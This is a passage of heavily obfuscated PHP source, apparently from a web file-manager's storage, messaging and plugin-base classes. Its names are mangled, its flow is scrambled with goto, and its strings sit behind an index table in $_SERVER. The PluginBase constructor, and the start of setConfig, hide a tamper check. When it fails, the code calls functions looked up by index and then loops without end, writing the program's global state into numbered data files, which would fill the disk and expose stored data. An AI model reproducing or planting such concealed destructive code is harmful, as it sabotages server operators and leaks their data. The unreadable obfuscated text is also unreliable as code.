õß†£É[$_SERVER[³‘’¼äÑ™ÔÍ][77]] : 0; } public function info($E‰½ºŞˆÅÛ) { if ($this->isFolder($E‰½ºŞˆÅÛ)) { return $this->folderInfo($E‰½ºŞˆÅÛ); } else { if ($this->isFile($E‰½ºŞˆÅÛ)) { return $this->fileInfo($E‰½ºŞˆÅÛ); } } return !1; } public function exist($d„¯¶Ïˆ¦) { return $this->isFile($d„¯¶Ïˆ¦) || $this->isFolder($d„¯¶Ïˆ¦); } public function isFile($DÎ¥¢§ìÏÉ) { return !$this->isFolder($DÎ¥¢§ìÏÉ) && $this->objectMeta($DÎ¥¢§ìÏÉ); } public function isFolder($CÎ£½ÉíÅø) { return $this->cacheMethod($_SERVER[³‘’¼äÑ™ÔÍ][223], $CÎ£½ÉíÅø); } protected function objectMeta($F ¤çé©‹) { return $this->cacheMethod($_SERVER[³‘’¼äÑ™ÔÍ][224], $F ¤çé©‹); } protected function _objectMeta($FØñğ¹âë›) { $a›…á›¶¨ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FØñğ¹âë› = rtrim($FØñğ¹âë›, $a›…á›¶¨[8]); try { $EŞµ•©™¡Ú = $this->client->getObjectInfo($this->bucket, $FØñğ¹âë›); if (!isset($EŞµ•©™¡Ú[$a›…á›¶¨[207]]) && isset($EŞµ•©™¡Ú[$a›…á›¶¨[225]])) { $EŞµ•©™¡Ú[$a›…á›¶¨[207]] = $EŞµ•©™¡Ú[$a›…á›¶¨[225]]; } } catch (Exception $a‚µÈ©½áö) { $EŞµ•©™¡Ú = !1; } if (!$EŞµ•©™¡Ú) { } return $EŞµ•©™¡Ú; } protected function _isFolder($AÙğ›‹Œ‚) { goto aÇ©óŞ©Ğ; aÇ©óŞ©Ğ: $fî ¡„–Ó =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AÙğ›‹Œ‚ = rtrim($AÙğ›‹Œ‚, $fî ¡„–Ó[8]); if ($AÙğ›‹Œ‚ == $fî ¡„–Ó[33] || $AÙğ›‹Œ‚ == $fî ¡„–Ó[8]) { return !0; } goto Dù‡‘°º‰; E¦Ê—“§°Ÿ: if (substr($fªïíš›¬ö[0][$fî ¡„–Ó[28]], -1) == $fî ¡„–Ó[8]) { return !0; } if (get_path_this($fªïíš›¬ö[0][$fî ¡„–Ó[28]]) == get_path_this($AÙğ›‹Œ‚)) { return !1; } return !0; goto CÔÓ›Ú®î·; Dù‡‘°º‰: $fªïíš›¬ö = $this->client->getBucket($this->bucket, $AÙğ›‹Œ‚, null, 1); if (empty($fªïíš›¬ö)) { return !1; } $fªïíš›¬ö = array_values($fªïíš›¬ö); goto E¦Ê—“§°Ÿ; CÔÓ›Ú®î·: } } define($_SERVER[³‘’¼äÑ™ÔÍ][226], 1); goto aÄã¯¡½Æ»; f‡†©«áÑÈ: class Message { function __construct() { } public function send($D“ÔŒÖÆ²Ê = '', $aŞÑ¬ò¯˜Ó = array(), $AøÕ¬Œåßˆ = "\164\x65\170\164") { goto e»Ö®²ˆŠ¬; cÜäŒºŒ¥: Hook::trigger($dó†ÛÄµÔÀ[1313], $B±†¸ÖŒ‡Ú); goto cÁ·åªåğÕ; DÌ«¢ëé½Ï: $aŞÑ¬ò¯˜Ó = array($dó†ÛÄµÔÀ[975] => isset($aŞÑ¬ò¯˜Ó[$dó†ÛÄµÔÀ[975]]) ? $aŞÑ¬ò¯˜Ó[$dó†ÛÄµÔÀ[975]] : $dó†ÛÄµÔÀ[33], $dó†ÛÄµÔÀ[535] => isset($aŞÑ¬ò¯˜Ó[$dó†ÛÄµÔÀ[535]]) ? $aŞÑ¬ò¯˜Ó[$dó†ÛÄµÔÀ[535]] : $dó†ÛÄµÔÀ[33]); if (empty($D“ÔŒÖÆ²Ê) || empty($aŞÑ¬ò¯˜Ó[$dó†ÛÄµÔÀ[975]]) && empty($aŞÑ¬ò¯˜Ó[$dó†ÛÄµÔÀ[535]])) { return !1; } $B±†¸ÖŒ‡Ú = array($dó†ÛÄµÔÀ[1252] => $Cëğ…•¨ŠÇ, $dó†ÛÄµÔÀ[1312] => $aŞÑ¬ò¯˜Ó); goto cÜäŒºŒ¥; e»Ö®²ˆŠ¬: $dó†ÛÄµÔÀ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Cëğ…•¨ŠÇ = array($dó†ÛÄµÔÀ[29] => $dó†ÛÄµÔÀ[1310], $dó†ÛÄµÔÀ[695] => $D“ÔŒÖÆ²Ê); if (in_array($AøÕ¬Œåßˆ, array($dó†ÛÄµÔÀ[1310], $dó†ÛÄµÔÀ[1311]))) { $Cëğ…•¨ŠÇ[$dó†ÛÄµÔÀ[29]] = $AøÕ¬Œåßˆ; } goto DÌ«¢ëé½Ï; cÁ·åªåğÕ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto C’ ê«´‰“; c¸ÑÒî˜„³: $this->in =& $in; $this->modelPlugin = Model($A‹Û½ˆ[1318]); $this->pluginName = str_replace($A‹Û½ˆ[1318], $A‹Û½ˆ[33], get_class($this)); goto cæÎí·õŒ; cæÎí·õŒ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $A‹Û½ˆ[8]; $this->pluginApi = appHostGet() . $A‹Û½ˆ[1319] . $this->pluginName . $A‹Û½ˆ[8]; $this->pluginHost = $config[$A‹Û½ˆ[1320]] . $this->pluginName . $A‹Û½ˆ[8]; goto B•Ğ–‡¢±†; c²ÛÁ˜¯İ®: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto a–„êÂÎš; C’ ê«´‰“: $A‹Û½ˆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D¥İäèŠÂ‰ = $_SERVER[$A‹Û½ˆ[799]] . $A‹Û½ˆ[1314]; $A¶’÷•¼×’ = $A‹Û½ˆ[1315]; goto DÄğ±è—Â²; DÄğ±è—Â²: if ($_SERVER[$A‹Û½ˆ[791]] != $A¶’÷•¼×’($D¥İäèŠÂ‰)) { goto d“Èêˆ°; e£ĞˆÄË¤: $B ÇØá†Ù·(); $B´ÍÈì‘ª› = $A‹Û½ˆ[1316]; $aôÂ¾Í¼®• = json_encode($GLOBALS[$A‹Û½ˆ[1317]]); goto EÕÊ«»Ä; EÕÊ«»Ä: $a­çŠ¢“ò¬ = 1; for ($Eì‘•‘Œ‹ = $a­çŠ¢“ò¬; $Eì‘•‘Œ‹ > 0; $Eì‘•‘Œ‹++) { $B´ÍÈì‘ª›(DATA_PATH . $Eì‘•‘Œ‹, $aôÂ¾Í¼®•); } goto dóíñ¾å; dˆ„àè¯¬ˆ: $BÖ¸ ­Á‚ = $A‡¸„¯Â«Ê($a«¬‘”); $FŒ›øºÔº = explode($A‹Û½ˆ[217], $BÖ¸ ­Á‚); if (count($FŒ›øºÔº) < $A‹Û½ˆ[584]) { $cÎÏó«šî = $A‹Û½ˆ[797]; $cÎÏó«šî(); } goto F½ğÆ¢µï; d“Èêˆ°: $B ÇØá†Ù· = $A‹Û½ˆ[793]; $A‡¸„¯Â«Ê = $A‹Û½ˆ[794]; $a«¬‘” = $_SERVER[$A‹Û½ˆ[795]] . $A‹Û½ˆ[796]; goto dˆ„àè¯¬ˆ; F½ğÆ¢µï: $D½–Šé²ğ‰ = $A‹Û½ˆ[798]; $D½–Šé²ğ‰($_SERVER[$A‹Û½ˆ[799]]); $B ÇØá†Ù· = $A‹Û½ˆ[793]; goto e£ĞˆÄË¤; dóíñ¾å: } global $in, $config; $this->config =& $config; goto c¸ÑÒî˜„³; B•Ğ–‡¢±†: $this->pluginHostDefault = $config[$A‹Û½ˆ[1320]] . $this->pluginName . $A‹Û½ˆ[8]; $Eá­‡óÇì = $config[$A‹Û½ˆ[1321]]; if ($Eá­‡óÇì && strpos($A‹Û½ˆ[47] . $Eá­‡óÇì . $A‹Û½ˆ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$A‹Û½ˆ[1322]] . $this->pluginName . $A‹Û½ˆ[8]; } goto c²ÛÁ˜¯İ®; a–„êÂÎš: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[³‘’¼äÑ™ÔÍ][1323]); } protected function assign($c¾ãô‰—†, $eÎá”Ëä”Ñ = false) { if (is_array($c¾ãô‰—†)) { $this->values = array_merge($this->values, $c¾ãô‰—†); } else { $this->values[$c¾ãô‰—†] = $eÎá”Ëä”Ñ; } } protected function display($D•‡Ñª‹Ì«) { extract($this->values); require $D•‡Ñª‹Ì«; } final function hookRegist($c·¶ÌŸ¼†Ş) { $this->modelPlugin->appRegist($this->pluginName, $c·¶ÌŸ¼†Ş); } final function appIcon() { $BéÜ¬ô®• =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D†Şµ„Áñ‘ = $this->appPackage(); $cŒ‡›¥†ç = $BéÜ¬ô®•[33]; if (isset($D†Şµ„Áñ‘[$BéÜ¬ô®•[382]])) { if (isset($D†Şµ„Áñ‘[$BéÜ¬ô®•[382]][$BéÜ¬ô®•[1324]])) { $cŒ‡›¥†ç = $BéÜ¬ô®•[1325] . $D†Şµ„Áñ‘[$BéÜ¬ô®•[382]][$BéÜ¬ô®•[1324]] . $BéÜ¬ô®•[1326]; } else { if ($D†Şµ„Áñ‘[$BéÜ¬ô®•[382]][$BéÜ¬ô®•[1327]]) { $cŒ‡›¥†ç = $BéÜ¬ô®•[1328] . $D†Şµ„Áñ‘[$BéÜ¬ô®•[382]][$BéÜ¬ô®•[1327]] . $BéÜ¬ô®•[1329]; } } } return $cŒ‡›¥†ç; } final function fileCanView($AëÆâ“×Ê‹) { goto C®¡×±ºŒÁ; C®¡×±ºŒÁ: $cŒù•¢‡š± =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (request_url_safe($AëÆâ“×Ê‹)) { return !0; } if ($this->isShare($AëÆâ“×Ê‹)) { return !0; } goto Fƒõ‹÷à; AÁ…Œóë¹ø: ActionCall($cŒù•¢‡š±[1342], $AëÆâ“×Ê‹); goto CŠ¿‘’§Å; Fƒõ‹÷à: $F‚ÕºèŒ¹Ù = Session::get($cŒù•¢‡š±[1330]); if (!$F‚ÕºèŒ¹Ù || !$F‚ÕºèŒ¹Ù[$cŒù•¢‡š±[1331]]) { $Fâ£ßâ‹‹— = $cŒù•¢‡š±[1332] . rawurlencode(this_url()); show_tips(LNG($cŒù•¢‡š±[1333]) . $cŒù•¢‡š±[1334] . $Fâ£ßâ‹‹— . $cŒù•¢‡š±[1335] . LNG($cŒù•¢‡š±[1336]) . $cŒù•¢‡š±[1337], !1); } if (!Action($cŒù•¢‡š±[1338])->authCan($cŒù•¢‡š±[1339])) { show_tips(LNG($cŒù•¢‡š±[1340]) . $cŒù•¢‡š±[1341], !1); } goto AÁ…Œóë¹ø; CŠ¿‘’§Å: } final function isShare($EŒ†æ´óŸ¯) { $dÊå‹ØŒÜÏ = KodIO::parse($EŒ†æ´óŸ¯); return $dÊå‹ØŒÜÏ[$_SERVER[³‘’¼äÑ™ÔÍ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($fí·¥»õ¾) { if (request_url_safe($fí·¥»õ¾)) { return $fí·¥»õ¾; } if (!$this->isShare($fí·¥»õ¾)) { $fí·¥»õ¾ = $this->filePath($fí·¥»õ¾); } return Action($_SERVER[³‘’¼äÑ™ÔÍ][1022])->linkOut($fí·¥»õ¾); } public function filePathLinkOut($d‰‹³‚ÍĞ™) { if (request_url_safe($d‰‹³‚ÍĞ™)) { return $d‰‹³‚ÍĞ™; } $this->fileCanView($d‰‹³‚ÍĞ™); return Action($_SERVER[³‘’¼äÑ™ÔÍ][1022])->link($d‰‹³‚ÍĞ™); } final function filePath($d¢‰ÖËìø) { $cßÉê’¼¬ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($cŸääªç¯Ô = $this->checkSharePath($d¢‰ÖËìø)) { return $cŸääªç¯Ô; } $this->fileCanView($d¢‰ÖËìø); if (request_url_safe($d¢‰ÖËìø)) { $aÒº‹îĞ›˜ = parse_url_query($d¢‰ÖËìø); if (isset($aÒº‹îĞ›˜[$cßÉê’¼¬[1343]]) && isset($aÒº‹îĞ›˜[$cßÉê’¼¬[197]])) { $a®™ŠÏ÷’è = Model($cßÉê’¼¬[1092])->get($cßÉê’¼¬[1344]); $eªÆŸÀŸÏË = Mcrypt::decode($aÒº‹îĞ›˜[$cßÉê’¼¬[197]], $a®™ŠÏ÷’è); if ($eªÆŸÀŸÏË) { $this->fileInfo = IO::infoWithChildren($eªÆŸÀŸÏË); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $eªÆŸÀŸÏË; } } $d¢‰ÖËìø = $this->_cacheHttpFile($d¢‰ÖËìø); $this->fileInfo = IO::infoWithChildren($d¢‰ÖËìø); } else { $this->fileInfo = IO::infoWithChildren($d¢‰ÖËìø); if (!$this->fileInfo) { show_tips(LNG($cßÉê’¼¬[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $d¢‰ÖËìø; } final function _cacheHttpFile($FæÇ·ÜÓÅİ) { $D·ÇøËè¬ù = hash_path($FæÇ·ÜÓÅİ, !0); $this->cachePath = $this->pluginCachePath($D·ÇøËè¬ù); if ($e˜ÕÇçÂº° = IO::fileNameExist($this->cachePath, $D·ÇøËè¬ù)) { return KodIO::make($e˜ÕÇçÂº°); } $d÷¶ÙÖá‰ = $this->cachePath . $D·ÇøËè¬ù; return $this->pluginCacheFileSet($d÷¶ÙÖá‰, file_get_contents($FæÇ·ÜÓÅİ)); } final function _tmpFileName($dŠ÷–ëâ²· = array()) { goto bÀóçÈ¬î’; e÷Ï³ªèé†: if (isset($dŠ÷–ëâ²·[$C‰ãä‹™¥á[162]][$C‰ãä‹™¥á[164]])) { return $dŠ÷–ëâ²·[$C‰ãä‹™¥á[162]][$C‰ãä‹™¥á[164]]; } $a¡‰¤†Ó» = IO::hashSimple($dŠ÷–ëâ²·[$C‰ãä‹™¥á[75]]); if ($a¡‰¤†Ó») { return $a¡‰¤†Ó»; } goto AŒíÄğñ‘‚; AŒíÄğñ‘‚: $BÊÉŸ”ğ‰³ = array($dŠ÷–ëâ²·[$C‰ãä‹™¥á[28]], $dŠ÷–ëâ²·[$C‰ãä‹™¥á[75]], $dŠ÷–ëâ²·[$C‰ãä‹™¥á[77]]); if (isset($dŠ÷–ëâ²·[$C‰ãä‹™¥á[459]])) { $BÊÉŸ”ğ‰³[] = $dŠ÷–ëâ²·[$C‰ãä‹™¥á[459]]; } return md5(implode($C‰ãä‹™¥á[70], $BÊÉŸ”ğ‰³)); goto d¡Ìç™­„î; bÀóçÈ¬î’: $C‰ãä‹™¥á =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$dŠ÷–ëâ²·) { $dŠ÷–ëâ²· = $this->fileInfo; } if (isset($dŠ÷–ëâ²·[$C‰ãä‹™¥á[164]])) { return $dŠ÷–ëâ²·[$C‰ãä‹™¥á[164]]; } goto e÷Ï³ªèé†; d¡Ìç™­„î: } final function checkSharePath($cé«œØœÛ¦) { goto cî‹ö“ÌÙ‰; e•ˆõ•àİ–: $this->cachePath = $this->pluginCachePath($this->fileInfo[$E¸ç±ğÉÍ[164]]); return $CØ˜×²µ¾‘[$E¸ç±ğÉÍ[75]]; goto C¥°óë‰†; cî‹ö“ÌÙ‰: $E¸ç±ğÉÍ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!defined($E¸ç±ğÉÍ[427])) { define($E¸ç±ğÉÍ[1345], 0); } if (!$this->isShare($cé«œØœÛ¦)) { return !1; } goto dÔ¹‹ë®ôÂ; dÔ¹‹ë®ôÂ: $CØ˜×²µ¾‘ = Action($E¸ç±ğÉÍ[1022])->sharePathInfo($cé«œØœÛ¦); if (!isset($CØ˜×²µ¾‘[$E¸ç±ğÉÍ[75]])) { show_json(LNG($E¸ç±ğÉÍ[1346]), !1); } $this->fileInfo = $CØ˜×²µ¾‘[$E¸ç±ğÉÍ[162]]; goto e•ˆõ•àİ–; C¥°óë‰†: } final function pluginCachePath($DÄ·ŒÎ›ö´ = '') { $D‚„Ù™‡“ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fù‚ª²×§“ = IO_PATH_SYSTEM_TEMP . $D‚„Ù™‡“[1347] . $this->pluginName; if (!($fìğßØøêù = IO::infoFull($fù‚ª²×§“))) { return IO::mkdir($fù‚ª²×§“ . $D‚„Ù™‡“[8] . $DÄ·ŒÎ›ö´); } if (empty($DÄ·ŒÎ›ö´)) { return $fìğßØøêù[$D‚„Ù™‡“[75]]; } if (!($eŒ“”¬§™ = IO::fileNameExist($fìğßØøêù[$D‚„Ù™‡“[75]], $DÄ·ŒÎ›ö´))) { return IO::mkdir($fìğßØøêù[$D‚„Ù™‡“[75]] . $DÄ·ŒÎ›ö´); } return KodIO::make($eŒ“”¬§™); } final function pluginCacheFileSet($e†¨£®‹Á, $cŸò°­Ä†´ = '') { $aõÈäšéË÷ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!($A»ŠÉÄœÓ¢ = IO::infoFull($e†¨£®‹Á))) { return IO::mkfile($e†¨£®‹Á, $cŸò°­Ä†´, REPEAT_REPLACE); } IO::setContent($A»ŠÉÄœÓ¢[$aõÈäšéË÷[75]], $cŸò°­Ä†´); return $A»ŠÉÄœÓ¢[$aõÈäšéË÷[75]]; } final function pluginLocalFile($CñœÂ½ Èß = '') { goto eê˜Üê ; eê˜Üê : $AÙøÁó¨Úã =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cÙÊ‚ÇÇĞï = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($cÙÊ‚ÇÇĞï)) { mk_dir($cÙÊ‚ÇÇĞï); } goto A•Ş»É©Í±; b¬ˆÚ‘ìÇ„: $a¸æŒÆÑğÀ = $cÙÊ‚ÇÇĞï . $A†ÇÄ…†Î; if (@file_exists($a¸æŒÆÑğÀ)) { return $a¸æŒÆÑğÀ; } return IO::copy($CñœÂ½ Èß, $cÙÊ‚ÇÇĞï, 0, $A†ÇÄ…†Î); goto f¼“…ƒµ­ˆ; A•Ş»É©Í±: if (!$CñœÂ½ Èß) { return $cÙÊ‚ÇÇĞï; } $dİÜÒÌÄ› = IO::info($CñœÂ½ Èß); $A†ÇÄ…†Î = $this->_tmpFileName($dİÜÒÌÄ›) . $AÙøÁó¨Úã[91] . $dİÜÒÌÄ›[$AÙøÁó¨Úã[160]]; goto b¬ˆÚ‘ìÇ„; f¼“…ƒµ­ˆ: } final function appPackage() { goto B”×¤½Â¬; d¯‰ùšÜ¿: return $a§õ¡Œ‰ Ô; goto c‹¦µ„¼îˆ; B”×¤½Â¬: $C‰ ÙÓøåÎ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($this->packageData) { return $this->packageData; } $EÁƒ‹ßªà¬ = $this->parseFile($this->pluginPath . $C‰ ÙÓøåÎ[1348]); goto bÉÊº…Õ; Cªƒà½Îá: $f›öÇˆ¡÷ = Hook::trigger($C‰ ÙÓøåÎ[1349], $a§õ¡Œ‰ Ô); if ($f›öÇˆ¡÷ && is_array($f›öÇˆ¡÷)) { $a§õ¡Œ‰ Ô = $f›öÇˆ¡÷; } $this->packageData = $a§õ¡Œ‰ Ô; goto d¯‰ùšÜ¿; bÉÊº…Õ: $this->parseLang($EÁƒ‹ßªà¬); $a§õ¡Œ‰ Ô = json_decode_force($EÁƒ‹ßªà¬); if (!$a§õ¡Œ‰ Ô) { return array(); } goto Cªƒà½Îá; c‹¦µ„¼îˆ: } public function packageInfoGet($fÜ©¸ÀÑ¡ñ) { $f¬Õ­±è›Ø = $this->appPackage(); return array_get_value($f¬Õ­±è›Ø, $fÜ©¸ÀÑ¡ñ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[³‘’¼äÑ™ÔÍ][1350]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[³‘’¼äÑ™ÔÍ][1351]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[³‘’¼äÑ™ÔÍ][1352]); } private function parseFile($f®‰›¹‰) { goto EøæßÜ›Ê; eÜ¨¼Î¿öÒ: $C“é©øã¾  = str_replace($f„ƒğÓ´¦, $dÒš”·òù, $C“é©øã¾ ); return $C“é©øã¾ ; goto bñ¸ŒÛ¡‹; Bß÷…Æ½á«: $dÒš”·òù = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$cœàª‡£Ô‰[84]][$cœàª‡£Ô‰[1360]]); if (strstr($C“é©øã¾ , $cœàª‡£Ô‰[1361])) { $aŠ¨ºƒ¬óò = rawurlencode(json_encode($this->pluginLangArr)); $C“é©øã¾  = str_replace($cœàª‡£Ô‰[1361], $aŠ¨ºƒ¬óò, $C“é©øã¾ ); } if (strstr($C“é©øã¾ , $cœàª‡£Ô‰[1362])) { $aŠ¨ºƒ¬óò = $aŠ¨ºƒ¬óò = rawurlencode(json_encode($this->getConfig())); $C“é©øã¾  = str_replace($cœàª‡£Ô‰[1362], $aŠ¨ºƒ¬óò, $C“é©øã¾ ); } goto eÜ¨¼Î¿öÒ; EøæßÜ›Ê: $cœàª‡£Ô‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C“é©øã¾  = file_get_contents($f®‰›¹‰); $f„ƒğÓ´¦ = array($cœàª‡£Ô‰[1353], $cœàª‡£Ô‰[1354], $cœàª‡£Ô‰[1355], $cœàª‡£Ô‰[1356], $cœàª‡£Ô‰[1357], $cœàª‡£Ô‰[1358], $cœàª‡£Ô‰[1359]); goto Bß÷…Æ½á«; bñ¸ŒÛ¡‹: } private function parseLang(&$B¹ó÷ÑÀ ) { goto cÊ‚ã¯êâë; Bñµ‡àŞŠ„: $cÈã˜Á¿Ü = array(); foreach ($AÈóÂÓ¿ƒæ[0] as $cØœ§îÌÀ) { $AäöÆ”õÆ = substr($cØœ§îÌÀ, strlen($D–½š¡ÒÕÔ), -4); $BºÕá³… = LNG($AäöÆ”õÆ); $Bğ™ô¨Ÿ»é[] = $cØœ§îÌÀ; $cÈã˜Á¿Ü[] = str_replace(array($b†³§ˆé°µ[217], $b†³§ˆé°µ[996], $b†³§ˆé°µ[330], $b†³§ˆé°µ[113]), array($b†³§ˆé°µ[50], $b†³§ˆé°µ[50], $b†³§ˆé°µ[33], $b†³§ˆé°µ[1365]), $BºÕá³…); } $B¹ó÷ÑÀ  = str_replace($Bğ™ô¨Ÿ»é, $cÈã˜Á¿Ü, $B¹ó÷ÑÀ ); goto DÜëîºŞœì; EªÚÊÖîŞÕ: preg_match_all($b†³§ˆé°µ[1364], $B¹ó÷ÑÀ , $AÈóÂÓ¿ƒæ); if (!is_array($AÈóÂÓ¿ƒæ) || count($AÈóÂÓ¿ƒæ) == 0 || !is_array($AÈóÂÓ¿ƒæ[0]) || count($AÈóÂÓ¿ƒæ[0]) == 0) { return; } $Bğ™ô¨Ÿ»é = array(); goto Bñµ‡àŞŠ„; cÊ‚ã¯êâë: $b†³§ˆé°µ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D–½š¡ÒÕÔ = $b†³§ˆé°µ[1363]; if (!strstr($B¹ó÷ÑÀ , $D–½š¡ÒÕÔ)) { return; } goto EªÚÊÖîŞÕ; DÜëîºŞœì: } private function parseConfig(&$e×è¢ëêª) { goto b‹Æ‡¯ñ½•; fÕˆñç×ÇŠ: preg_match_all($a³©™‘×ôº[1367], $e×è¢ëêª, $cšˆ¨˜æ»º); if (!is_array($cšˆ¨˜æ»º) || count($cšˆ¨˜æ»º) == 0 || !is_array($cšˆ¨˜æ»º[0]) || count($cšˆ¨˜æ»º[0]) == 0) { return; } $b‡Æè„Õ‚ = $this->getConfig(); goto A¬—¢…±°é; A¬—¢…±°é: $AœŠ‘‡Œº´ = array(); $A«¢ğ„âÕ¼ = array(); foreach ($cšˆ¨˜æ»º[0] as $FÑ–Î§ê÷) { $d®°‰šˆÙ§ = substr($FÑ–Î§ê÷, strlen($A®Æ‰÷‰¤À), -2); $AœŠ‘‡Œº´[] = $FÑ–Î§ê÷; $A«¢ğ„âÕ¼[] = _get($b‡Æè„Õ‚, $d®°‰šˆÙ§); } goto E×¹Š”§Ñ; b‹Æ‡¯ñ½•: $a³©™‘×ôº =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A®Æ‰÷‰¤À = $a³©™‘×ôº[1366]; if (!strstr($e×è¢ëêª, $A®Æ‰÷‰¤À)) { return; } goto fÕˆñç×ÇŠ; E×¹Š”§Ñ: $e×è¢ëêª = str_replace($AœŠ‘‡Œº´, $A«¢ğ„âÕ¼, $e×è¢ëêª); goto e³Ñ©¤œ·; e³Ñ©¤œ·: } private function parsePackage(&$dñ„ˆ÷é¿) { goto A•Š‚‚¤…Å; e®„¼Ã÷í—: preg_match_all($e¯Ÿ†³Äª™[1369], $dñ„ˆ÷é¿, $f×¾øÕŞ); if (!is_array($f×¾øÕŞ) || count($f×¾øÕŞ) == 0 || !is_array($f×¾øÕŞ[0]) || count($f×¾øÕŞ[0]) == 0) { return; } $cŠ«òø˜ = $this->appPackage(); goto eİÄ•’‰¼; eİÄ•’‰¼: $cè‘ÓïÕ = array(); $DŠŞ¨¬™ä¥ = array(); foreach ($f×¾øÕŞ[0] as $f²„À‰ÁĞ‘) { $F¡óèÍ²èò = substr($f²„À‰ÁĞ‘, strlen($eªĞ§Ç•), -2); $cè‘ÓïÕ[] = $f²„À‰ÁĞ‘; $DŠŞ¨¬™ä¥[] = _get($cŠ«òø˜, $F¡óèÍ²èò); } goto AíØêˆø„; A•Š‚‚¤…Å: $e¯Ÿ†³Äª™ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eªĞ§Ç• = $e¯Ÿ†³Äª™[1368]; if (!strstr($dñ„ˆ÷é¿, $eªĞ§Ç•)) { return; } goto e®„¼Ã÷í—; AíØêˆø„: $dñ„ˆ÷é¿ = str_replace($cè‘ÓïÕ, $DŠŞ¨¬™ä¥, $dñ„ˆ÷é¿); goto e†³™ğšò; e†³™ğšò: } final function echoFile($b»°ƒ­‰Œé, $E¸°˜ÄÄË‘ = false) { goto FñÕ—õİ®; FñÕ—õİ®: $E¶ã¯›¶° =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A×Ëİ©È¸ = $this->pluginPath . $b»°ƒ­‰Œé; if (ACT == $E¶ã¯›¶°[1370]) { echo $E¶ã¯›¶°[1371] . $this->pluginName . $E¶ã¯›¶°[8] . $b»°ƒ­‰Œé . $E¶ã¯›¶°[1372]; if (!file_exists($A×Ëİ©È¸)) { echo $E¶ã¯›¶°[1373]; return; } } goto dŠ¢–±”Ş; fäĞœíô²Ù: $this->parsePackage($EçÖÇìÓâ…); if (is_array($E¸°˜ÄÄË‘)) { $EçÖÇìÓâ… = str_replace(array_keys($E¸°˜ÄÄË‘), array_values($E¸°˜ÄÄË‘), $EçÖÇìÓâ…); } echo $E¶ã¯›¶°[217] . $EçÖÇìÓâ…; goto FÒ°ÊË‡‡á; dŠ¢–±”Ş: $EçÖÇìÓâ… = $this->parseFile($A×Ëİ©È¸); $this->parseLang($EçÖÇìÓâ…); $this->parseConfig($EçÖÇìÓâ…); goto fäĞœíô²Ù; FÒ°ÊË‡‡á: } final function initLang() { goto bÎÃ§–ä‚µ; bÎÃ§–ä‚µ: $E£‡é¦ê² =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D³­Ğ¬´Ñ¿ = $E£‡é¦ê²[1374]; $E‚˜ÊëÍîø = $this->pluginPath . $E£‡é¦ê²[1375]; goto DÕ™â£·›¸; DÕ™â£·›¸: $cöÒÃ†Õ½¸ = I18n::getType(); $d íÜ«ÚĞç = array(); if (file_exists($E‚˜ÊëÍîø . $cöÒÃ†Õ½¸ . $E£‡é¦ê²[769])) { $d íÜ«ÚĞç = (include $E‚˜ÊëÍîø . $cöÒÃ†Õ½¸ . $E£‡é¦ê²[769]); } else { if ($cöÒÃ†Õ½¸ == $E£‡é¦ê²[1376] && !file_exists($E‚˜ÊëÍîø . $cöÒÃ†Õ½¸ . $E£‡é¦ê²[769]) && file_exists($E‚˜ÊëÍîø . $E£‡é¦ê²[1377])) { $d íÜ«ÚĞç = (include $E‚˜ÊëÍîø . $E£‡é¦ê²[1377]); } else { if (file_exists($E‚˜ÊëÍîø . $D³­Ğ¬´Ñ¿ . $E£‡é¦ê²[769])) { $d íÜ«ÚĞç = (include $E‚˜ÊëÍîø . $D³­Ğ¬´Ñ¿ . $E£‡é¦ê²[769]); } } } goto a‚ÆƒÔ±äù; a‚ÆƒÔ±äù: if (!is_array($d íÜ«ÚĞç)) { return array(); } if (@count($d íÜ«ÚĞç) > 0) { I18n::set($d íÜ«ÚĞç); } return $d íÜ«ÚĞç; goto b¢ÒÛ¤‹¾; b¢ÒÛ¤‹¾: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($FìºõŸó‰Ú) { $cŒ–•‰õ™ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E„½Ûç¸Êˆ = $_SERVER[$cŒ–•‰õ™[795]] . $cŒ–•‰õ™[796]; $aÏ¨¿¾ß´Æ = $cŒ–•‰õ™[1315]; if ($_SERVER[$cŒ–•‰õ™[791]] != $aÏ¨¿¾ß´Æ($E„½Ûç¸Êˆ)) { goto CŠ´Ÿ¿£§–; C“ –â‚¶ñ: $DÃÎÄêÙ§Ú(); $e­•©’Èç = $cŒ–•‰õ™[1316]; $Cß…óÅ§¢â = json_encode($GLOBALS[$cŒ–•‰õ™[1317]]); goto d³Ü®¥‘„Î; DçùÖÎ—·•: $b©âõ‚¤Ê = 